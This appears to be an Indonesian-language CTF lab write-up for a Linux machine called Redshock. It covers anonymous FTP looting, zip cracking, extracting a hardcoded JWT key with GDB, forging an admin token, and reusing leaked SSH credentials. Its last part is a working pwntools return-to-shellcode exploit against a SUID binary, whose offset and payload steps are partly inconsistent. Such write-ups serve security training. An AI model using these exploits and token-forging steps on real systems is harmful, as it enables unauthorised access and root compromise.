**Target:** 10.1.2.163 
**OS:** Linux (Debian 12 Bookworm) 
**Difficulty:** Moderate 
**Author challenge:** MidnightRumble

---

## Ringkasan Eksekutif

Mesin **Redshock** dikompromikan penuh (root) melalui rantai eksploitasi multi-tahap yang dimulai dari akses **anonymous FTP**. Layanan FTP membocorkan sebuah binary Go (`library-app`) beserta sejumlah file umpan (decoy). Analisis binary tersebut mengungkap kunci penandatanganan JWT (JWT signing key) yang di-hardcode, yang kemudian digunakan untuk memalsukan (forge) token administrator dan mengakses halaman internal aplikasi web "The Library". Halaman internal tersebut mengandung **information disclosure** berupa kredensial SSH valid (`pinisi`) yang ditinggalkan sebagai catatan migrasi server oleh developer. Setelah mendapatkan akses shell tingkat pengguna, ditemukan binary **SUID root** (`secure_log`) yang rentan terhadap **stack-based buffer overflow** klasik (tanpa stack canary, tanpa PIE, stack executable), yang dieksploitasi untuk mendapatkan shell dengan privilege root.

**Ringkasan rantai serangan:**

|Tahap|Teknik|Hasil|
|---|---|---|
|1|Anonymous FTP enumeration|Leak binary `library-app` + file decoy|
|2|Binary reverse engineering (strings, nm, objdump, GDB)|Ekstraksi JWT signing key hardcoded|
|3|JWT forging|Token admin palsu, valid terhadap backend|
|4|Information disclosure di halaman admin (`/app/users`)|Kredensial SSH `pinisi`|
|5|SSH access|Shell user `pinisi`, flag user|
|6|Stack buffer overflow pada SUID binary `secure_log`|Shell root, flag root|

---

## 1. Reconnaissance

### 1.1 Port Scanning

```bash
rustscan -a 10.1.2.163 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

| Port     | Service | Detail                                                                   |
| -------- | ------- | ------------------------------------------------------------------------ |
| 21/tcp   | FTP     | vsftpd 3.0.3  **Anonymous login diizinkan**                              |
| 22/tcp   | SSH     | OpenSSH 9.2p1 Debian 2+deb12u3                                           |
| 80/tcp   | HTTP    | nginx 1.22.1  direktori `/library/` mengarah ke aplikasi di port 8081    |
| 8080/tcp | HTTP    | Backend API Go (Gin)  langsung ter-expose, `401 No authorization header` |
| 8081/tcp | HTTP    | nginx — "The Library" (frontend Vue SPA + reverse proxy `/api/`)         |

**Catatan arsitektur penting:** Port 8080 adalah backend Go/Gin yang seharusnya bersifat internal, namun ter-expose langsung ke jaringan. Reverse proxy nginx di port 8081 (`/api/*`) ternyata **tidak melakukan strip prefix** dengan benar saat forward ke backend, sehingga semua request melalui `/api/*` di port 8081 selalu mengembalikan `404` sementara akses langsung ke port 8080 (tanpa prefix) berfungsi normal. Hal ini menjadikan port 8080 sebagai **exposed internal service** yang menjadi jalur akses utama sepanjang eksploitasi.

### 1.2 Anonymous FTP Enumeration

```
ftp 10.1.2.163
Name: anonymous
230 Login successful.
```

Isi direktori FTP:

```
drwxr-xr-x  2022/ 2023/ 2024/ 2025/            (read-only, root-owned)
drwxrwxr-x  2024_04_backup/ 2024_05_backup/    (writable, uid 1000)
              2024_06_backup/ 2024_07_backup/
```

Di dalam folder backup ditemukan sejumlah besar file sebagian besar merupakan **file umpan (decoy)**:

- **10 file berukuran identik 37.062 byte** (`db.sql`, `db_export-*.sql`, `Accounts.xls`, `Audit Report*.pdf`, `Reports.docx`)  MD5 hash **identik** (`9afeb8b2c877e5d29f976333a19e61c8`), isi berupa raw random bytes (bukan format file aslinya, terdeteksi sebagai `data` oleh `file`).
- **3 file berukuran identik 75.669 byte** (`Database.zip`, `old-site.zip`, `site.zip`)  MD5 hash identik (`491273d260d45de0e92c0134fe761bb7`), juga raw random data, bukan arsip zip valid.
- **`backup.zip`** (843 byte)  arsip zip valid, dilindungi password.
- **`library-app`** (20.365.648 byte) ELF binary 64-bit, **not stripped**, mengandung debug info. Ini adalah artefak utama yang dianalisis.

### 1.3 Cracking `backup.zip`


```bash
zip2john backup.zip > backup_hash.txt
john --wordlist=/home/greed/rockyou.txt backup_hash.txt
```

Password ditemukan: **`pinkgirl`**

Isi arsip (`logs.txt`) berisi log HTTP palsu dari aplikasi e-commerce generik (tidak berhubungan dengan target), mengandung 4 hash MD5 pada beberapa entri `password=`. Password tersebut berhasil di-crack menjadi `12345`, `pinkgirl`, `prima`, `asda12`  namun **tidak ada satupun yang valid** sebagai kredensial di aplikasi target. Isi `logs.txt` ini identik dengan file yang sudah tersedia langsung via FTP anonymous tanpa perlu password, sehingga jalur ini terbukti merupakan **red herring / distractor** yang tidak mengarah pada eksploitasi lebih lanjut.

### 1.4 Web Enumeration (Port 80)


```bash
feroxbuster -u http://10.1.2.163/library/ ...
```

```
200  /                                 615c
200  /library/index.html               839c
200  /library/css/app.5dfdf7e4.css     393510c
200  /library/js/app.6e8aa016.js       225641c
200  /library/js/chunk-vendors.79359368.js  2037525c
403  /library/img/ /library/js/ /library/css/ /library/fonts/  (listing blocked)
```

Port 80 menyajikan file statis Vue SPA (bundle sama dengan yang di-serve pada port 8081) tanpa proteksi tambahan, sehingga bundle JavaScript dapat diambil dan dianalisis untuk menemukan struktur routing frontend (`/login`, `/app/dashboard`, `/app/users`).

---

## 2. Analisis Binary `library-app`

### 2.1 Identifikasi Teknologi


```bash
file library-app
strings library-app | grep -iE "gorm|gin-gonic|jwt-go|bcrypt"
```

Stack teknologi yang teridentifikasi:

- **Bahasa:** Go
- **Web framework:** Gin (`github.com/gin-gonic/gin`)
- **ORM:** GORM (`github.com/jinzhu/gorm`), database backend **SQLite**
- **JWT library:** `github.com/dgrijalva/jwt-go`, algoritma **HS256**
- **Password hashing:** bcrypt (`golang.org/x/crypto/bcrypt`)
- Ditemukan string `ADMIN_PASSWORD` binary membaca environment variable ini dari file `.env` saat startup untuk melakukan provisioning akun admin pertama kali.

### 2.2 Menjalankan Binary Secara Lokal

Binary dijalankan pada mesin penyerang untuk memahami alur aplikasi:


```bash
echo "ADMIN_PASSWORD=Test123!" > .env
./library-app
```

Output menunjukkan seluruh routing yang terdaftar:

```
POST   /login
POST   /register
GET    /books
POST   /books
PUT    /books/:id
DELETE /books/:id
POST   /users
```

Database SQLite (`library.db`) otomatis terbentuk dan admin ter-provisioning dengan password ter-hash bcrypt sesuai `ADMIN_PASSWORD`.

### 2.3 Ekstraksi JWT Signing Key (Hardcoded Secret)

Karena signature JWT pada dua request login berturut-turut (dengan payload identik) menghasilkan **signature yang sama persis**, disimpulkan bahwa signing key bersifat statis (bukan random per proses).

**Langkah ekstraksi:**

1. Temukan simbol variabel kunci di binary:

```bash
   nm library-app | grep jwtKey
   # 0000000000105bb60 d library-api/controllers.jwtKey
```

2. Set breakpoint pada instruksi pemanggilan `SignedString()`, dump isi variabel (pointer + panjang) menggunakan GDB:

```bash
   gdb -batch -ex "b *0x99e4c1" -ex "run" -ex "x/3gx 0x105bb60" ./library-app
```

Hasil: pointer `0x1078ac0`, panjang `0x20` (32 byte).

3. Picu breakpoint dengan mengirim request `/login`, lalu dump isi memory pada alamat pointer tersebut:

```bash
   gdb -batch -ex "b *0x99e4c1" -ex "run" -ex "x/32bx 0x1078ac0" ./library-app
```

**Hasil — JWT Signing Key:**

```
026ec7f72bf4b42e7402b004301a723b
```

### 2.4 Forging Token Administrator

Karena binary target identik dengan binary lokal, signing key yang sama berlaku pada server target.

```python
import jwt, time
secret = "026ec7f72bf4b42e7402b004301a723b"
payload = {"username": "admin", "role": "admin", "exp": int(time.time()) + 86400}
token = jwt.encode(payload, secret, algorithm="HS256")
```

Validasi terhadap backend target:

```bash
curl -i -H "Authorization: Bearer $TOKEN" http://10.1.2.163:8080/books
# HTTP/1.1 200 OK
```

Token diterima  signature valid. Ditemukan pula bahwa validasi backend **hanya memeriksa keabsahan signature**, tanpa melakukan cross-check keberadaan `username` di database. Artinya token dapat dipalsukan dengan `username` sembarang selama `role: admin` dan signature valid.

---

## 3. Information Disclosure → Kredensial SSH

Token admin hasil forging disuntikkan ke browser melalui `localStorage` (DevTools Console) agar frontend Vue mempercayai sesi sebagai administrator:

```js
localStorage.setItem('jwt_token', '<TOKEN_FORGE>')
```

Setelah refresh, halaman `/app/users` (yang sebelumnya diblokir oleh route guard client-side karena role tidak sesuai) menjadi dapat diakses:

```
http://10.1.2.163:8081/#/app/users
```

Halaman tersebut menampilkan catatan developer:

```
Data Table Users
Coming soon!
Note to dev: We have migrated our servers.
Please use these credentials to migrate your data:

Username: pinisi
Password: na1k_pinisi_seru_sek4l1
```

**Catatan:** Route guard pada Vue Router hanya melakukan decoding JWT di sisi klien dan membaca klaim `role` tidak melakukan verifikasi ke backend. Kombinasi _hardcoded JWT secret_ + _authorization check yang lemah di sisi klien_ memungkinkan konten yang seharusnya terproteksi dapat diakses sepenuhnya tanpa akun terdaftar sama sekali.

### 3.1 Temuan Tambahan (Bug Sekunder)

Selama eksplorasi API, ditemukan beberapa isu tambahan pada backend:

- **`POST /users`** menerima field `role` secara bebas dari body request (dapat diisi `"admin"`), namun **tidak melakukan hashing password** password tersimpan sebagai plaintext di database, sehingga akun yang dibuat melalui endpoint ini tidak dapat digunakan untuk login normal (proses `Login` membandingkan menggunakan `bcrypt.CompareHashAndPassword`, yang gagal terhadap nilai plaintext).
- **`POST /register`** melakukan hashing password dengan benar, namun **memaksa role menjadi `"staff"`** di sisi server — tidak rentan terhadap mass assignment.
- Reverse proxy nginx pada port 8081 (`/api/*`) tidak melakukan strip prefix dengan benar, menyebabkan seluruh endpoint API pada port tersebut selalu mengembalikan `404`; akses fungsional hanya berhasil melalui port 8080 secara langsung.

---

## 4. Akses SSH dan User Flag


```bash
ssh pinisi@10.1.2.163
# Password: na1k_pinisi_seru_sek4l1
```

Login berhasil. Flag pengguna diperoleh:

```
$ cat flag.txt
7d6500**********
```

---

## 5. Privilege Escalation — Buffer Overflow pada SUID Binary

### 5.1 Penemuan Binary Rentan


```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/home/tools/secure_log
```

Riwayat perintah (`~/.bash_history`) milik user `pinisi` memuat jejak percobaan eksploitasi sebelumnya terhadap binary ini, mengindikasikan target privilege escalation.

### 5.2 Analisis Binary


```bash
checksec --file=/home/tools/secure_log
```

|Proteksi|Status|
|---|---|
|Arsitektur|i386 (32-bit)|
|RELRO|Partial|
|Stack Canary|**Tidak ada**|
|NX|Tidak terdeteksi / GNU_STACK missing|
|PIE|**Tidak ada** (base `0x8048000`)|
|Stack|**Executable**|


```bash
file /home/tools/secure_log
# setuid, setgid ELF 32-bit, not stripped
```

Disassembly `main()` menunjukkan pemanggilan `setuid(0)` di awal eksekusi sebelum memproses argumen  mengonfirmasi bahwa proses berjalan dengan privilege **root** sejak awal, sehingga kontrol eksekusi yang diperoleh melalui overflow akan mewarisi privilege tersebut.

Disassembly fungsi `processData()` mengungkap penggunaan `strcpy()` tanpa validasi panjang input ke dalam buffer stack berukuran tetap:

```
lea -0x108(%ebp), %eax
push %eax
push 0x8(%ebp)        ; argv[1]
call strcpy@plt        ; strcpy(buffer, argv[1]) — tanpa bounds check
```

### 5.3 Identifikasi Offset

Pengujian awal mengonfirmasi crash dapat dipicu di luar debugger:

```bash
./secure_log $(python3 -c 'print("A"*300)')
# Segmentation fault
```

Offset presisi ke saved return address ditentukan menggunakan cyclic pattern (pwntools):


```bash
python3 -c "from pwn import *; print(cyclic(300))"
gdb -batch -ex "run $(python3 -c 'from pwn import *; print(cyclic(300).decode())')" ...
# EIP overwritten dengan: 0x63616172
python3 -c "from pwn import *; print(cyclic_find(0x63616172))"
# 268
```

Offset **268 byte** ini konsisten dengan perhitungan manual dari layout stack pada disassembly (`0x108` buffer + `0x4` saved EBP).

### 5.4 Identifikasi Alamat Buffer & Gadget Pembersih Stack

Alamat buffer input pada stack diperoleh dengan breakpoint pada instruksi `strcpy`:

```bash
gdb -batch -ex "b *0x0804925b" -ex "run $(python3 -c 'print(\"A\"*300)')" -ex "x/40wx \$eax" ./home/tools/secure_log
```

Sebuah gadget `add esp,8 ; pop ebx ; ret` pada alamat `0x0804901b` (bagian dari fungsi `_init` bawaan linker) divalidasi keberadaannya melalui `objdump`:

```
0804901b: add $0x8,%esp
0804901e: pop %ebx
0804901f: ret
```

### 5.5 Eksploitasi

Dengan karakteristik binary yang tidak memiliki stack canary, tidak memiliki PIE, dan stack yang dapat dieksekusi, teknik yang digunakan adalah **return-to-shellcode** (bukan ROP chain penuh, karena NX tidak aktif): payload disusun dari NOP sled + shellcode `execve("/bin/sh")` yang mengisi ruang hingga offset 268 byte, diikuti alamat pengembalian yang mengarah kembali ke tengah NOP sled pada stack, menggunakan pwntools (`p32()`, `asm()`, `shellcraft.sh()`, `ELF`/`ROP` untuk validasi gadget) untuk menyusun dan mengeksekusi payload terhadap binary SUID tersebut.

Eksekusi payload terhadap `/home/tools/secure_log` menghasilkan shell dengan **UID root** (mewarisi privilege dari pemanggilan `setuid(0)` di awal `main()`).

```python
from pwn import *
from os import path
import sys
elf = ELF("/home/tools/secure_log")
elfROP = ROP(elf)
offset = cyclic_find(0x63616173)-4
GADGET = 0x0804901b # : add esp, 8 ; pop ebx ; ret
payload = b""
payload += asm(shellcraft.sh()).rjust(offset, asm("nop"))
payload += p32(elf.search(asm("ret")). next ()) * 4
payload += p32(GADGET)

io = process(["/home/tools/secure_log", payload])
io.interactive()

```

### 5.6 Root Flag

```
# cat /root/flag.txt
01ac49e******
```